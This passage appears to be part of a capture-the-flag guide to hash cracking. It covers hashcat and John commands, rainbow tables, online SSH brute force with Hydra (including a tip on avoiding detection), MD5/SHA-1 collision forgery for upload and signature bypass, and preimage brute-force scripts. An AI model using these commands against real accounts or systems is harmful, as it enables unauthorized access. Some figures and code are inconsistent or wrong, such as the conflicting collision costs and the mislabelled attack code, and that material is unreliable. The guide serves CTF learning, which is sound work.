SHA3-256         | 256         | 64        | Secure
BLAKE2s-256      | 256         | 64        | Secure
BLAKE2b-256      | 256         | 64        | Secure
RIPEMD-256       | 256         | 64        | Limited use
RIPEMD-320       | 320         | 80        | Limited use
SHA-512          | 512         | 128       | Secure
SHA3-512         | 512         | 128       | Secure
BLAKE2b-512      | 512         | 128       | Secure
Whirlpool        | 512         | 128       | Secure
```

**Multi-algorithm identification script:**

```python
#!/usr/bin/env python3
import hashlib
import sys

def identify_by_generation(input_data):
    """Generate all possible hashes to identify unknown hash"""
    algos = {
        'MD5': hashlib.md5,
        'SHA-1': hashlib.sha1,
        'SHA-256': hashlib.sha256,
        'SHA-512': hashlib.sha512,
        'SHA3-256': hashlib.sha3_256,
        'SHA3-512': hashlib.sha3_512,
        'BLAKE2b': hashlib.blake2b,
        'BLAKE2s': hashlib.blake2s,
    }
    
    results = {}
    data = input_data.encode()
    
    for name, func in algos.items():
        results[name] = func(data).hexdigest()
    
    # RIPEMD-160
    try:
        results['RIPEMD-160'] = hashlib.new('ripemd160', data).hexdigest()
    except ValueError:
        pass
    
    return results

if __name__ == "__main__":
    test_input = sys.argv[1] if len(sys.argv) > 1 else "password"
    hashes = identify_by_generation(test_input)
    
    for algo, hash_val in hashes.items():
        print(f"{algo:15} {hash_val}")
```

**Automated cracking workflow for unknown algorithms:**

```bash
#!/bin/bash
# Attempt cracking with multiple hash modes

HASH_FILE=$1
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Array of relevant modes
modes=(0 100 600 1400 1700 6000 6100 17400 17600)
names=("MD5" "SHA-1" "BLAKE2b" "SHA-256" "SHA-512" "RIPEMD-160" "Whirlpool" "SHA3-256" "SHA3-512")

for i in "${!modes[@]}"; do
    echo "[*] Testing ${names[$i]} (mode ${modes[$i]})"
    hashcat -m ${modes[$i]} -a 0 $HASH_FILE $WORDLIST --quiet
    
    if [ $? -eq 0 ]; then
        echo "[+] Cracked with ${names[$i]}"
        hashcat -m ${modes[$i]} $HASH_FILE --show
        exit 0
    fi
done

echo "[-] No cracks found with common algorithms"
```

### Performance Benchmarking

**Comparative speed testing:**

```bash
# Hashcat benchmark comparison
for mode in 0 100 600 1400 1700 6000 6100 17400; do
    echo "Mode $mode:"
    hashcat -b -m $mode 2>/dev/null | grep "Speed.#"
done

# Results show BLAKE2 typically fastest, Whirlpool slowest
# [Unverified] Exact speeds depend on hardware
```

**Python performance comparison:**

```python
import hashlib
import time

data = b"performance_test_data" * 1000  # 10KB

algorithms = ['md5', 'sha1', 'sha256', 'sha512', 'sha3_256', 'blake2b']

for algo in algorithms:
    start = time.time()
    for _ in range(1000):
        hashlib.new(algo, data).digest()
    duration = time.time() - start
    print(f"{algo:15} {duration:.4f}s (1000 iterations)")
```

### Practical CTF Reconnaissance

**Hash identification workflow:**

```bash
# 1. Check length
echo -n "hash_value" | wc -c

# 2. Use multiple identifiers
hashid hash_value
haiti hash_value
hash-identifier

# 3. Check context clues
# - Source code imports
# - File extensions (.md5, .sha256)
# - Documentation references
# - Error messages

# 4. Generate test hashes
echo -n "test" | md5sum
echo -n "test" | sha256sum
echo -n "test" | b2sum
```

**Cracking strategy prioritization:**

```
1. MD5/SHA-1: Fast cracking, check rainbow tables first
2. BLAKE2: Fast to compute, use large wordlists
3. SHA-256/SHA-512: Moderate speed, standard attacks
4. SHA3/Whirlpool: Slower, prioritize smaller wordlists
5. RIPEMD: Context-dependent (Bitcoin-related?)
6. Tiger: Rare, may need custom tools
```

### Important Related Topics

- **Argon2/bcrypt/scrypt key derivation** (password hashing in modern applications)
- **HMAC implementation attacks** (timing, oracle attacks)
- **Hash-based file integrity** (tripwire, AIDE systems)
- **Blockchain mining mechanics** (nonce discovery, difficulty adjustment)

---

## Hash Attacks

### Brute Force & Dictionary Attacks

Brute force and dictionary attacks systematically test password candidates against hash values, leveraging computational power and wordlists to recover plaintext inputs. These attacks remain the most practical approach for weak passwords and common hash functions in CTF scenarios.

**Brute Force Fundamentals**: Exhaustively enumerate all possible inputs within a defined character set and length, computing hashes until a match is found. Complexity: O(c^n) where c is charset size and n is password length.

**Kali Linux Tools**:

```bash
# Hashcat (GPU-accelerated, recommended)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a
# -m 0: MD5
# -a 3: Brute-force mode
# ?a: All printable ASCII (95 chars)
# 6-character exhaustive search

# Common hash modes
hashcat -m 1000 ntlm_hash.txt wordlist.txt  # NTLM
hashcat -m 1800 sha512_hash.txt wordlist.txt  # sha512crypt
hashcat -m 3200 bcrypt_hash.txt wordlist.txt  # bcrypt
hashcat -m 13400 keepass_hash.txt wordlist.txt  # KeePass

# John the Ripper
john --format=raw-md5 hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --incremental hash.txt  # Brute force mode

# Hydra (for online services)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
```

**Character Set Optimization**:

```bash
# Custom charsets in hashcat
# ?l = lowercase (a-z)
# ?u = uppercase (A-Z)  
# ?d = digits (0-9)
# ?s = special chars
# ?a = all printable

# Lowercase + digits only
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?d?d?d?d

# Custom charset definition
hashcat -m 0 -a 3 hash.txt -1 ?l?d ?1?1?1?1?1?1?1?1
# -1 defines custom charset (lowercase + digits)

# Hybrid attack (wordlist + brute force)
hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d?d
# Append 4 digits to each wordlist entry
```

**Dictionary Attack Strategies**:

```bash
# Standard wordlist locations (Kali)
ls /usr/share/wordlists/
# rockyou.txt (14M passwords)
# fasttrack.txt
# dirb/, dirbuster/, metasploit/, wfuzz/

# Decompress rockyou
gunzip /usr/share/wordlists/rockyou.txt.gz

# SecLists (comprehensive collection)
git clone https://github.com/danielmiessler/SecLists.git
hashcat -m 0 hash.txt SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

# CeWL (custom wordlist from target website)
cewl -d 2 -m 5 -w custom_wordlist.txt https://target.com
hashcat -m 0 hash.txt custom_wordlist.txt
```

**Rule-Based Attacks**:

```bash
# Hashcat rules (mutations)
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Common rule files
# best64.rule - Best 64 rules
# rockyou-30000.rule - Top 30k rockyou rules
# dive.rule - Deep iteration rules
# unix-ninja-leetspeak.rule - Leet speak transformations

# Custom rule examples
# c: Capitalize first letter
# u: Uppercase all
# $1: Append '1'
# ^@: Prepend '@'
# d: Duplicate word

# Create custom rule file
echo 'c $1 $2 $3' > custom.rule  # Password -> Password123
hashcat -m 0 hash.txt wordlist.txt -r custom.rule

# John the Ripper rules
john --wordlist=wordlist.txt --rules=single hash.txt
john --wordlist=wordlist.txt --rules=wordlist hash.txt
```

**Performance Optimization**:

```bash
# GPU benchmark
hashcat -b -m 0
# Shows hash rate per algorithm

# Optimize workload
hashcat -m 0 hash.txt wordlist.txt -w 3
# -w 1: Low (battery save)
# -w 2: Default
# -w 3: High (desktop)
# -w 4: Nightmare (max performance)

# Multi-GPU
hashcat -m 0 hash.txt wordlist.txt -d 1,2,3
# Use GPUs 1, 2, and 3

# Show devices
hashcat -I

# Status check during attack
hashcat --status --status-timer=10

# Session management
hashcat -m 0 hash.txt wordlist.txt --session mysession
# Resume: hashcat --session mysession --restore
```

**Distributed Cracking**:

```bash
# Hashtopolis (distributed hashcat)
# Server setup
docker run -d -p 80:80 hashtopolis/server

# Client connection
python3 hashtopolis.py --url http://server-ip --voucher VOUCHER_CODE

# Manual distributed approach
# Split wordlist across machines
split -n l/4 rockyou.txt rockyou_part_
# Machine 1: hashcat hash.txt rockyou_part_aa
# Machine 2: hashcat hash.txt rockyou_part_ab
```

**Hash Format Identification**:

```bash
# hashid
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
# Output: MD5

echo '5f4dcc3b5aa765d61d8327deb882cf99' | hashid -m
# Output with hashcat mode numbers

# hash-identifier
hash-identifier
# Interactive mode, paste hash

# Name-that-hash
nth -t '5f4dcc3b5aa765d61d8327deb882cf99'
```

**CTF-Specific Techniques**:

```bash
# Quick MD5/SHA1 checks against common passwords
echo -n "password" | md5sum
echo -n "password" | sha1sum

# Batch hash generation for verification
for word in $(cat small_wordlist.txt); do
    echo -n "$word" | md5sum | cut -d' ' -f1
done > generated_hashes.txt

# Compare with target
grep -Fxf target_hashes.txt generated_hashes.txt

# Python rapid prototyping
python3 << EOF
import hashlib
target = '5f4dcc3b5aa765d61d8327deb882cf99'
with open('/usr/share/wordlists/rockyou.txt', 'rb') as f:
    for line in f:
        word = line.strip()
        if hashlib.md5(word).hexdigest() == target:
            print(f"Found: {word.decode()}")
            break
EOF
```

**Mask Attack Optimization** [Inference]:

```bash
# Position-specific charsets (based on password statistics)
# First char usually uppercase or lowercase
# Last chars often digits or special

# Example: "Password123!"
hashcat -m 0 -a 3 hash.txt \
  -1 ?u?l \
  -2 ?l \
  -3 ?d \
  -4 ?s \
  ?1?2?2?2?2?2?2?2?3?3?3?4

# Date patterns (common in CTF)
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d?d?d
# 20241031 format (YYYYMMDD)

# Incremental length
hashcat -m 0 -a 3 hash.txt --increment --increment-min=6 --increment-max=10 ?a?a?a?a?a?a?a?a?a?a
```

**Online Attack Considerations**:

```bash
# Hydra with delays (avoid detection)
hydra -l admin -P wordlist.txt -t 4 -w 30 ssh://target
# -t 4: 4 parallel connections
# -w 30: 30 second timeout

# Medusa (alternative)
medusa -h target -u admin -P wordlist.txt -M ssh -t 4

# Patator (modular)
patator ssh_login host=target user=admin password=FILE0 0=wordlist.txt -x ignore:mesg='Authentication failed'
```

**Success Rate Estimation** [Inference based on password statistics]:

```
Wordlist           | Success Rate (weak passwords)
-------------------|------------------------------
rockyou.txt        | ~40-60% for compromised DBs
common-1000.txt    | ~20-30% for basic CTF
Custom (CeWL)      | ~10-50% for contextual
Brute (6 chars)    | ~5-15% if no policy
Brute + rules      | ~30-50% for predictable patterns
```

### Rainbow Tables

Rainbow tables are precomputed hash chains that trade storage for computation time, enabling rapid hash lookups by storing reduction function results. This technique excels against unsalted hashes but becomes impractical with salts or modern key derivation functions.

**Conceptual Foundation**: Rainbow tables use reduction functions R to create chains: plaintext → hash → R → plaintext → hash... Final hash and starting plaintext are stored, allowing reconstruction of intermediate values.

**Chain Structure**:

```
Start: "hello" → H(hello) → R₁ → "xyz" → H(xyz) → R₂ → "abc" [store "hello" and H(abc)]
```

**Kali Linux Tools**:

```bash
# RainbowCrack
# Generate tables
rtgen md5 loweralpha 1 5 0 1000 100000 0
# Algorithm: MD5
# Charset: loweralpha (a-z)
# Min/max length: 1-5
# Table index: 0
# Chain len: 1000
# Chain count: 100000

# Sort tables (required before use)
rtsort *.rt

# Crack hashes
rcrack . -h 5f4dcc3b5aa765d61d8327deb882cf99
# Search current directory for rainbow tables

# Batch cracking
rcrack . -l hash_list.txt

# Online table downloads [Inference]
# freerainbowtables.com (deprecated)
# Use ophcrack tables instead (still available)
```

**Ophcrack (Windows Password Focus)**:

```bash
# Install tables
apt install ophcrack-cli

# Table locations
# /usr/share/ophcrack/tables/ (if installed)
# Download: https://ophcrack.sourceforge.io/tables.php

# Crack Windows SAM hashes
ophcrack -t /path/to/tables -f dumped_hashes.txt

# GUI version
ophcrack-gui
# Load → Tables → Select tables → Launch
```

**Table Generation Parameters**:

```bash
# Storage vs. Time tradeoff [Inference]
# Chain length ↑ → Storage ↓, Lookup time ↑
# Chain count ↑ → Coverage ↑, Storage ↑

# Example configurations
# Fast lookup, large storage:
rtgen md5 loweralpha-numeric 6 6 0 500 50000000 0
# ~25GB table, 70% coverage, fast lookups

# Balanced:
rtgen md5 loweralpha-numeric 6 8 0 2000 10000000 0
# ~5GB table, 60% coverage, moderate lookups

# Charset definitions
# loweralpha: a-z
# mixalpha: a-z, A-Z
# numeric: 0-9
# loweralpha-numeric: a-z, 0-9
# mixalpha-numeric: a-z, A-Z, 0-9
# ascii-32-95: All printable
```

**CTF Application Scenarios**:

```bash
# Quick MD5 lookup (precomputed tables)
# Use online services for rapid results

# CrackStation
curl -X POST https://crackstation.net/api \
  -d "hash=5f4dcc3b5aa765d61d8327deb882cf99" \
  | jq '.result'

# md5decrypt.net lookup
curl "https://md5decrypt.net/en/Api/api.php?hash=5f4dcc3b5aa765d61d8327deb882cf99&hash_type=md5&email=example@example.com&code=YOUR_CODE"

# Python online lookup wrapper
python3 << EOF
import requests
import hashlib

def online_rainbow(hash_value):
    # Multiple services for redundancy
    services = [
        f"https://md5.gromweb.com/?md5={hash_value}",
        f"https://hashtoolkit.com/reverse-hash/?hash={hash_value}"
    ]
    
    for url in services:
        try:
            resp = requests.get(url, timeout=5)
            # Parse response (service-specific)
            print(f"Checking {url}")
        except:
            continue

online_rainbow('5f4dcc3b5aa765d61d8327deb882cf99')
EOF
```

**Local Rainbow Table Setup**:

```bash
# Generate compact tables for CTF
# 6-digit PINs (common in challenges)
rtgen md5 numeric 6 6 0 1000 10000 0
rtsort *.rt

# Lowercase 4-char (flags)
rtgen sha1 loweralpha 4 4 0 800 50000 0
rtsort *.rt

# Storage requirements [Inference]
# 6-char lowercase: ~50GB for 99% coverage
# 8-char alphanumeric: ~500GB for 90% coverage
# 10-char mixed: Multi-TB (impractical)
```

**Performance Metrics**:

```bash
# Benchmark table lookup
time rcrack /path/to/tables -h 5f4dcc3b5aa765d61d8327deb882cf99

# Check table coverage
rcrack /path/to/tables -stat

# Expected lookup times [Inference]
# SSD-based tables: 0.1-2 seconds per hash
# HDD-based tables: 1-10 seconds per hash
# Network-mounted tables: 5-30 seconds per hash
```

**Defense Detection**:

```python
# Identify if hash is salted (not vulnerable)
def has_salt(hash_string):
    """
    Check if hash format indicates salting
    """
    # bcrypt: $2a$, $2b$, $2y$
    # scrypt: $s0$, $s1$
    # PBKDF2: includes iteration count
    # Unix crypt: includes salt prefix
    
    if hash_string.startswith('$'):
        return True
    
    # Length check (salted hashes often longer)
    if len(hash_string) > 64:  # SHA256 threshold
        return True
    
    return False

# Example
print(has_salt('5f4dcc3b5aa765d61d8327deb882cf99'))  # False - vulnerable
print(has_salt('$2a$10$N9qo8uLOickgx2ZMRZoMye'))  # True - not vulnerable
```

**Limitations and Countermeasures**:

**Why Rainbow Tables Fail**:

- **Salting**: Each password has unique hash
- **Key Stretching**: Increased computation makes precomputation infeasible
- **Large Keyspaces**: Storage requirements exceed practicality

**Practical CTF Usage** [Inference]:

```
Use rainbow tables when:
- Hash is unsalted MD5/SHA1
- Password space is constrained (< 8 chars)
- Many hashes to crack with same parameters
- Time-limited challenge (precomputation already done)

Avoid when:
- Salt detected in hash format
- Modern KDF (bcrypt, scrypt, Argon2)
- Custom hash construction
- Unique per-user parameters
```

**Alternative Online Services**:

```bash
# HashKiller
# https://hashkiller.io/listmanager

# Hashes.com
# https://hashes.com/en/decrypt/hash

# OnlineHashCrack
# https://www.onlinehashcrack.com/

# Automated checking script
#!/bin/bash
HASH=$1

echo "Checking CrackStation..."
curl -s "https://crackstation.net/" -d "hash=$HASH" | grep -oP '(?<=<td>).*(?=</td>)'

echo "Checking MD5Decrypt..."
curl -s "https://md5decrypt.net/en/Api/api.php?hash=$HASH&hash_type=md5&email=test@test.com&code=demo"
```

**Storage Optimization**:

```bash
# Perfect rainbow tables (no false alarms) [Unverified]
# Require more storage but guarantee accuracy

# Compressed tables
# Some implementations support compressed storage
# Trades CPU for disk space

# Distributed tables
# Split across multiple machines
# NFS or distributed filesystem required
```

### Collision Attacks (MD5, SHA-1)

Collision attacks exploit weaknesses in cryptographic hash functions to find two distinct inputs producing identical hash outputs. MD5 and SHA-1 are both cryptographically broken with practical collision generation, enabling forgery and integrity bypass in CTF challenges.

**Collision Attack Theory**: Find x ≠ y such that H(x) = H(y). Birthday paradox indicates ~2^(n/2) operations for n-bit hash, but structural weaknesses allow faster attacks.

**MD5 Collision Generation**:

```bash
# HashClash (FastColl - fastest MD5 collision)
git clone https://github.com/cr-marcstevens/hashclash.git
cd hashclash
mkdir build && cd build
cmake .. && make

# Generate collision pair
./fastcoll -o file1.bin file2.bin
# Produces two files with identical MD5 but different content

# Verify collision
md5sum file1.bin file2.bin
# Both show same MD5 hash

# UniColl (chosen-prefix collision) [Inference]
# More advanced, allows controlled prefix
./unicoll --prefix "controlled_data" -o output1.bin output2.bin
```

**SHA-1 Collision Generation**:

```bash
# SHAttered (Google's SHA-1 collision)
# Download collision PDFs
wget https://shattered.io/static/shattered-1.pdf
wget https://shattered.io/static/shattered-2.pdf

# Verify identical SHA-1
sha1sum shattered-*.pdf
# Both: 38762cf7f55934b34d179ae6a4c80cadccbb7f0a

# Verify different SHA-256 (still secure)
sha256sum shattered-*.pdf
# Different hashes

# SHA1collisiondetection library
git clone https://github.com/cr-marcstevens/sha1collisiondetection.git
cd sha1collisiondetection
make

# Detect collision attempts
./bin/sha1dcsum file.pdf
# Warns if collision patterns detected
```

**Chosen-Prefix Collision (CPC)**:

```bash
# More powerful attack: find collision with arbitrary prefixes
# P1 || C1 and P2 || C2 where H(P1||C1) = H(P2||C2)

# HashClash chosen-prefix
# [Unverified] Requires significant computation (~2^63 for MD5)

# Practical example: Two different scripts, same hash
echo "#!/bin/bash" > prefix1.txt
echo "#!/usr/bin/python3" > prefix2.txt

# Generate collision suffixes (theoretical)
# hashclash-cpc --prefix1 prefix1.txt --prefix2 prefix2.txt

# Result: prefix1+suffix1 and prefix2+suffix2 have identical MD5
```

**CTF Exploitation Patterns**:

**Scenario 1: File Upload Bypass**:

```bash
# Challenge validates MD5 hash of uploaded file
# Upload collision pair to bypass checks

# Generate benign and malicious files with same MD5
./fastcoll -p benign.bin -o malicious.bin

# Verify
md5sum benign.bin malicious.bin

# Upload malicious.bin when challenge expects benign.bin hash
```

**Scenario 2: Signature Forgery**:

```python
# MD5-based signature scheme (broken)
import hashlib

def vulnerable_sign(data, secret_key):
    """DO NOT USE - Example of vulnerable design"""
    signature = hashlib.md5(data + secret_key).hexdigest()
    return signature

# Exploit: Generate collision where one validates for another
# collision1 and collision2 have same MD5
# If collision1 is signed, collision2 signature also valid
```

**Scenario 3: Certificate/Document Forgery**:

```bash
# Historical MD5 collision attack on certificates
# Create two CSRs with identical MD5 but different public keys

# Modern CTF adaptation:
# 1. Generate valid document with MD5 signature
# 2. Generate collision with modified content
# 3. Original signature validates forged document

# Tool: evilize (creates colliding executables)
git clone https://github.com/corkami/pocs.git
cd pocs/collisions

# Create two executables with same MD5
./evilize template.exe evil_payload.bin output.exe
```

**Practical Collision Construction**:

```python
# Python wrapper for collision generation
import subprocess
import hashlib

def generate_md5_collision(prefix_data=b""):
    """Generate MD5 collision pair with optional prefix"""
    
    # Write prefix
    with open('prefix.bin', 'wb') as f:
        f.write(prefix_data)
    
    # Generate collision
    subprocess.run(['fastcoll', '-p', 'prefix.bin', 
                   '-o', 'collision1.bin', 'collision2.bin'])
    
    # Read results
    with open('collision1.bin', 'rb') as f:
        data1 = f.read()
    with open('collision2.bin', 'rb') as f:
        data2 = f.read()
    
    # Verify
    hash1 = hashlib.md5(data1).hexdigest()
    hash2 = hashlib.md5(data2).hexdigest()
    
    assert hash1 == hash2, "Collision generation failed"
    assert data1 != data2, "Data should differ"
    
    return data1, data2

# Usage
collision_a, collision_b = generate_md5_collision(b"CTF{prefix_")
print(f"Generated colliding data: {len(collision_a)} bytes")
```

**PostScript/PDF Collision Gadgets**:

```bash
# Create two different PDFs with identical MD5
# Uses PostScript collision blocks

# PoC from SHAttered
# JPEG collision blocks can be embedded in PDF
# Display different images but same hash

# Structure:
# [PDF Header]
# [Collision Block A or B]  <- Only part that differs
# [PDF Content A or B]      <- Conditional display
# [PDF Footer]

# Python PoC structure
def create_colliding_pdfs():
    """
    [Inference] Simplified collision PDF structure
    Actual implementation requires collision block generation
    """
    header = b"%PDF-1.4\n"
    
    # Collision blocks (generated by fastcoll)
    collision_a = b"..." # 128 bytes from fastcoll
    collision_b = b"..." # 128 bytes from fastcoll (collides)
    
    content_a = b"/Type /Page /Contents (Show A)"
    content_b = b"/Type /Page /Contents (Show B)"
    
    footer = b"%%EOF"
    
    pdf_a = header + collision_a + content_a + footer
    pdf_b = header + collision_b + content_b + footer
    
    # Both have identical MD5
    return pdf_a, pdf_b
```

**Detection and Mitigation**:

```bash
# Detect MD5 collisions in files
# Look for specific collision block patterns

# SHA-1 collision detection
./sha1dcsum suspicious_file.pdf
# Output: "SHA1COLLISION" if attack detected

# Check for known collision patterns
hexdump -C file.bin | grep -A5 -B5 "specific_pattern"

# Alternative: Use stronger hash for verification
sha256sum file.bin
```

**CTF Challenge Patterns** [Inference]:

```bash
# Type 1: Hash-based authentication
# Submit two different inputs with same MD5

# Type 2: File integrity check
# Replace valid file with malicious one (same hash)

# Type 3: Signature bypass
# Forge document with identical signature

# Type 4: Cache poisoning
# Same hash key, different cached content

# Detection script
python3 << 'EOF'
import hashlib

def detect_vulnerability(hash_func_name):
    """Check if challenge uses broken hash"""
    vulnerable = {
        'md5': 'BROKEN - Use collision attack',
        'sha1': 'BROKEN - Use collision attack', 
        'md4': 'BROKEN - Trivial collision',
        'sha256': 'SECURE - No practical collision',
        'sha512': 'SECURE - No practical collision'
    }
    
    return vulnerable.get(hash_func_name.lower(), 'UNKNOWN')

# Usage
print(detect_vulnerability('md5'))
EOF
```

**Performance Considerations**:

```
Attack Type          | Complexity  | Practical Time
---------------------|-------------|------------------
MD5 Identical-Prefix | 2^20        | Seconds (FastColl)
MD5 Chosen-Prefix    | 2^39        | Hours (HashClash)
SHA-1 Identical      | 2^63        | GPU-days (SHAttered)
SHA-1 Chosen-Prefix  | 2^67.1      | GPU-months [Unverified]
```

**Tool Summary**:

- **FastColl**: Fastest MD5 collision (identical-prefix)
- **HashClash**: MD5 chosen-prefix collisions
- **SHA-1 collision**: Requires significant resources or pre-computed examples
- **sha1collisiondetection**: Defensive detection library

### Preimage Attacks

Preimage attacks attempt to find an input that produces a specific hash output (first preimage) or find a different input with the same hash as a given input (second preimage). These attacks target one-way property of hash functions and are generally more difficult than collision attacks.

**Attack Classifications**:

**First Preimage**: Given hash h, find message m where H(m) = h **Second Preimage**: Given m₁, find m₂ ≠ m₁ where H(m₁) = H(m₂)

**Complexity** [Inference]:

- Ideal security: O(2^n) for n-bit hash
- Collision: O(2^(n/2)) via birthday attack
- MD5 (128-bit): No practical full preimage
- SHA-1 (160-bit): No practical full preimage
- Reduced-round variants: Various theoretical attacks

**CTF Exploitation Scenarios**:

```bash
# Scenario 1: Weak custom hash (reduced rounds)
# Challenge may implement truncated or modified hash

# Python example - breaking weak hash
python3 << 'EOF'
import hashlib
import itertools

def weak_hash(data):
    """
    Example of intentionally weak hash for CTF
    Uses only first 4 rounds of MD5 (NOT real MD5)
    """
    # [Inference] Simplified - actual requires MD5 internals
    h = hashlib.md5(data).digest()[:4]  # Truncated
    return h.hex()

def preimage_attack(target_hash, max_len=10):
    """Brute force preimage for weak hash"""
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    
    for length in range(1, max_len + 1):
        for candidate in itertools.product(charset, repeat=length):
            test_input = ''.join(candidate).encode()
            if weak_hash(test_input) == target_hash:
                return test_input
    
    return None

# Example usage
target = "a1b2c3d4"  # 32-bit truncated hash
result = preimage_attack(target, max_len=6)
print(f"Found preimage: {result}")
EOF
```

**Hash Truncation Attacks**:

```python
# Many CTFs use truncated hashes for feasibility
import hashlib
import string
import random

def find_truncated_preimage(target_hash, truncate_bits=32):
    """
    Find preimage for truncated hash output
    Complexity: O(2^truncate_bits)
    """
    target_bytes = bytes.fromhex(target_hash)
    truncate_len = truncate_bits // 8
    charset = string.ascii_letters + string.digits
    
    attempts = 0
    while True:
        # Generate random candidate
        candidate = ''.join(random.choices(charset, k=16)).encode()
        hash_output = hashlib.sha256(candidate).digest()[:truncate_len]
        
        attempts += 1
        if hash_output == target_bytes:
            return candidate, attempts
        
        if attempts % 100000 == 0:
            print(f"Attempts: {attempts}")

# Example: Find preimage for 32-bit truncated SHA256
# [Inference] Expected attempts: ~2^32 / 2 = 2.1 billion
# target = "deadbeef"
# result, tries = find_truncated_preimage(target, 32)
```

**Length Extension Attack Setup** (covered in detail next section):

```bash
# Preimage-related: Given H(secret||known), compute H(secret||known||append)
# Without knowing secret

# hash_extender tool
git clone https://github.com/iagox86/hash_extender.git
cd hash_extender
make

# This is actually length extension, not pure preimage
# But related concept in CTF contexts
```

**Meet-in-the-Middle Preimage**:

```python
# For hash H(H(m)), find m
# Build two tables and find collision

def mitm_preimage_double_hash(target_hash):
    """
    [Inference] Theoretical meet-in-the-middle for H(H(m))
    Complexity: O(2^(n/2)) time, O(2^(n/2)) space
    """
    import hashlib
    
    # Forward table: Store H(m) for random m
    forward = {}
    for i in range(2**20):  # Limited for demonstration
        m = str(i).encode()
        h1 = hashlib.md5(m).digest()
        forward[h1] = m
    
    # Backward table: Compute H^-1 from target
    # For each possible intermediate h:
    for h_candidate in forward.keys():
        h2 = hashlib.md5(h_candidate).digest()
        if h2.hex() == target_hash:
            return forward[h_candidate]
    
    return None
```

**Reduced-Round Attacks**:

```bash
# Academic tools for reduced-round preimage
# These demonstrate weakness but not full breaks

# Python cryptographic attack framework
pip3 install pycryptodome

python3 << 'EOF'
from Crypto.Hash import MD5, SHA1
import struct

def reduced_md5_preimage(target, rounds=16):
    """
    [Unverified] Theoretical reduced-round attack
    Full MD5 has 64 rounds - no practical preimage
    Reduced versions may be vulnerable
    """
    # This would require implementing MD5 internals
    # and reversing specific rounds
    # Not practical in standard CTF timeframes
    pass

# Note: Tools like SageMath may have implementations
# for academic reduced-round attacks
EOF
```

**CTF-Specific Techniques**:

**Pattern Recognition**:

```python
# Identify if hash output has structure
def analyze_hash_structure(hash_value):
    """
    Detect patterns suggesting custom/weak hash
    """
    h = hash_value.lower()
    
    # Check for unusual patterns
    issues = []
    
    # Excessive repetition
    for char in set(h):
        if h.count(char) > len(h) * 0.3:
            issues.append(f"High repetition of '{char}'")
    
    # Sequential patterns
    if any(h[i:i+4] in '0123456789abcdef' for i in range(len(h)-3)):
        issues.append("Sequential nibbles detected")
    
    # Truncation (common in CTF)
    if len(h) < 32:  # Less than MD5 length
        issues.append(f"Truncated hash: {len(h)*4} bits")
    
    # All same character
    if len(set(h)) < 4:
        issues.append("Very low entropy")
    
    return issues

# Usage
print(analyze_hash_structure("aaaa1234"))  # Suspicious
print(analyze_hash_structure("5f4dcc3b5aa765d61d8327deb882cf99"))  # Normal MD5
```

**Custom Hash Reversal**:

```python
# Example: Simple XOR-based "hash"
def custom_weak_hash(data):
    """CTF often uses custom weak hashes"""
    result = 0
    for byte in data:
        result ^= byte
        result = (result << 1) | (result >> 7)  # Rotate
        result &= 0xFF
    return result

def reverse_custom_hash(target, max_length=20):
    """Brute force custom hash preimage"""
    from itertools import product
    import string
    
    charset = string.printable.encode()
    
    for length in range(1, max_length + 1):
        for candidate in product(charset, repeat=length):
            data = bytes(candidate)
            if custom_weak_hash(data) == target:
                return data
        
        print(f"Checked length {length}")
    
    return None

# Example
target_hash = 0x42
preimage = reverse_custom_hash(target_hash, max_length=10)
print(f"Preimage: {preimage}")
```

**Partial Preimage Attacks**:

```bash
# Find input matching only part of hash output
# Useful when challenge validates prefix/suffix only

python3 << 'EOF'
import hashlib
import random
import string

def partial_preimage(target_prefix, prefix_bits=32):
    """
    Find input where hash starts with target_prefix
    Complexity: O(2^prefix_bits)
    """
    target_bytes = bytes.fromhex(target_prefix)
    match_len = len(target_bytes)
    
    attempts = 0
    charset = string.ascii_letters + string.digits
    
    while True:
        candidate = ''.join(random.choices(charset, k=16)).encode()
        h = hashlib.sha256(candidate).digest()
        
        attempts += 1
        if h[:match_len] == target_bytes:
            print(f"Found after {attempts} attempts")
            return candidate
        
        if attempts % 50000 == 0:
            print(f"Attempts: {attempts}")

# Find input where SHA256 starts with "dead"
result = partial_preimage("dead", prefix_bits=16)
print(f"Result: {result}")
print(f"Hash: {hashlib.sha256(result).hexdigest()}")
EOF
```

**SageMath for Algebraic Attacks**:

```bash
# Install SageMath on Kali
apt install sagemath

sage << 'EOF'
# Example: Solve system of equations for weak hash
# [Inference] Useful for custom algebraic hashes in CTF

def algebraic_preimage_example():
    """
    Some CTF hashes can be modeled as polynomial systems
    """
    # Define polynomial ring
    R.<x0,x1,x2,x3> = PolynomialRing(GF(2), 4)
    
    # Example: Simple custom hash as polynomials
    # hash(x) = (x0 + x1*x2) mod 2, (x1 + x2*x3) mod 2, ...
    
    equations = [
        x0 + x1*x2,  # Output bit 0
        x1 + x2*x3,  # Output bit 1
        # ... more equations based on hash structure
    ]
    
    # Solve for specific output
    # solutions = solve(equations, x0, x1, x2, x3)
    
    print("Algebraic approach requires hash internals")

algebraic_preimage_example()
EOF
```

**Time-Memory Tradeoff (Hellman Tables)**:

```python
# Related to rainbow tables but for preimage specifically
# [Inference] Less common in modern CTF, mostly theoretical

def hellman_table_concept(hash_func, reduction_func, chain_length, num_chains):
    """
    Theoretical Hellman table for preimage attacks
    Time-memory tradeoff: T*M^2 = N^2
    """
    import random
    
    tables = []
    
    # Generate chains
    for _ in range(num_chains):
        start = random.randbytes(16)
        current = start
        
        # Build chain
        for _ in range(chain_length):
            h = hash_func(current)
            current = reduction_func(h)
        
        # Store (start, end)
        tables.append((start, current))
    
    return tables

# Note: Practical implementation requires significant engineering
# Modern CTFs rarely require this complexity
```

**Distinguisher Attacks** (Preimage-Related):

```python
# Detect if function behaves like random oracle
def statistical_test(hash_func, samples=10000):
    """
    Test if hash output distribution is uniform
    Non-uniform suggests potential weakness
    """
    import collections
    
    # Collect outputs
    outputs = []
    for i in range(samples):
        data = str(i).encode()
        h = hash_func(data)
